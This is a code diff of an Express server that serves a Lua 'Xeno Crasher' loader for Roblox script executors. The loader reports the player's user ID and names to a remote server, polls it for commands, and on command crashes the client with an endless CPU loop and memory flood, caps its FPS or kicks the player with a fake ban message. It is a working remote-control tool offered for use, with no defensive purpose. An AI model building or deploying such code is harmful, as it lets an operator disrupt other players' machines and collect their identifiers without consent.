@@ -20,45 +20,12 @@ const players = new Map();
 // LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - FINAL ]]--
+    const loader = `--[[ Xeno Crasher - WORKING ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "xenooooo"
 
 local HttpService = game:GetService("HttpService")
 HttpService.HttpEnabled = true
-
-local function findHttpFunction()
-    local functions = {
-        function() return syn and syn.request end,
-        function() return request end,
-        function() return http and http.request end,
-        function() return fluxus and fluxus.request end,
-        function() return http_request end,
-        function() 
-            local env = getgenv and getgenv() or getrenv and getrenv() or _G
-            return env and env.request
-        end,
-        function() return shared and shared.request end,
-        function() return HttpService.RequestAsync end,
-    }
-    
-    for _, getFunc in ipairs(functions) do
-        local success, func = pcall(getFunc)
-        if success and type(func) == "function" then
-            return func
-        end
-    end
-    
-    return function(options)
-        if options.Method == "POST" then
-            return HttpService:PostAsync(options.Url, options.Body or "", Enum.HttpContentType.ApplicationJson)
-        else
-            return HttpService:GetAsync(options.Url)
-        end
-    end
-end
-
-local request = findHttpFunction()
 
 local function sendRequest(method, url, data)
     local options = {
@@ -74,7 +41,19 @@ local function sendRequest(method, url, data)
     end
     
     local success, result = pcall(function()
-        return request(options)
+        if syn and syn.request then
+            return syn.request(options)
+        elseif request then
+            return request(options)
+        elseif http and http.request then
+            return http.request(options)
+        elseif fluxus and fluxus.request then
+            return fluxus.request(options)
+        elseif http_request then
+            return http_request(options)
+        else
+            return HttpService:RequestAsync(options)
+        end
     end)
     
     if success and result then
@@ -148,17 +127,6 @@ local function heartbeat()
     local result = sendRequest("POST", BASE .. "/api/public/heartbeat", data)
     if result then
         statusLabel.Text = "🟢 Connected"
-    else
-        local url = BASE .. "/api/public/heartbeat?user_id=" .. LP.UserId 
-            .. "&username=" .. HttpService:UrlEncode(LP.Name)
-            .. "&display_name=" .. HttpService:UrlEncode(LP.DisplayName)
-            .. "&executor=XenoClient&online=true"
-        result = sendRequest("GET", url, nil)
-        if result then
-            statusLabel.Text = "🟢 Connected"
-        else
-            statusLabel.Text = "⚠️ No connection"
-        end
     end
 end
 
@@ -184,62 +152,24 @@ local function setFPSLimit(targetFPS)
     end)
 end
 
-local pollRunning = false
-
--- ============================================
--- 🔥 CRASH FUNCTION (WORKS)
--- ============================================
 local function crashGame()
     statusLabel.Text = "💥 CRASHING!"
-    
-    -- Method 1: Infinite loop (fastest)
     task.spawn(function()
         while true do
             local x = 0
-            for i = 1, 1000000 do
-                x = x + i
-            end
+            for i = 1, 1000000 do x = x + i end
         end
     end)
-    
-    -- Method 2: Memory flood
     task.spawn(function()
         local t = {}
         while true do
-            for i = 1, 1000 do
-                t[#t + 1] = string.rep("X", 50000)
-            end
-            task.wait()
-        end
-    end)
-    
-    -- Method 3: Part spam
-    task.spawn(function()
-        for i = 1, 5000 do
-            local p = Instance.new("Part")
-            p.Size = Vector3.new(100, 100, 100)
-            p.Parent = workspace
-            p.Position = Vector3.new(
-                math.random(-1000, 1000),
-                math.random(-1000, 1000),
-                math.random(-1000, 1000)
-            )
-            task.wait(0.01)
-        end
-    end)
-    
-    -- Method 4: Crash the renderer
-    task.spawn(function()
-        while true do
-            workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(0.1, 0.1, 0.1)
+            for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
             task.wait()
         end
     end)
 end
 
--- ============================================
--- POLL - RECEIVES COMMANDS
--- ============================================
+local pollRunning = false
 local function poll()
     if pollRunning then return end
     pollRunning = true
@@ -251,22 +181,19 @@ local function poll()
         local data = HttpService:JSONDecode(result)
         print("📥 Received: " .. HttpService:JSONEncode(data))
         
-        -- FPS LIMIT
         if data.fps_limit then
             setFPSLimit(tonumber(data.fps_limit))
         else
             setFPSLimit(nil)
         end
         
-        -- 🔥 CRASH
         if data.crash == true then
-            print("💥 CRASH COMMAND RECEIVED!")
+            print("💥 CRASH!")
             crashGame()
         end
         
-        -- 👢 KICK (with custom message)
         if data.kick == true then
-            print("👢 KICK COMMAND RECEIVED!")
+            print("👢 KICK!")
             local kickMessage = data.kick_message or "You have been banned."
             task.wait(0.5)
             LP:Kick(kickMessage)
@@ -276,9 +203,6 @@ local function poll()
     pollRunning = false
 end
 
--- ============================================
--- START
--- ============================================
 print("🚀 Starting Xeno Crasher...")
 heartbeat()
 
@@ -299,8 +223,7 @@ task.spawn(function()
 end)
 
 print("✅ Xeno Crasher loaded!")
-print("👤 Player: " .. LP.Name)
-print("🔗 Connected to: " .. BASE)`;
+print("👤 Player: " .. LP.Name)`;
 
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
@@ -389,7 +312,7 @@ app.post('/api/command', (req, res) => {
     if (kick === true) {
         p._kick = true;
         p._kick_message = kick_message || "You have been banned.";
-        console.log(`👢 KICK SENT TO: ${p.username || userId} - Message: ${p._kick_message}`);
+        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
     }
     if (crash === true) {
         p._crash = true;
@@ -418,7 +341,7 @@ app.get('/api/public/command', (req, res) => {
     }
     if (p._kick) {
         response.kick = true;
-        response.kick_message = p._kick_message or "You have been banned.";
+        response.kick_message = p._kick_message || "You have been banned.";
         p._kick = false;
         p._kick_message = '';
     }
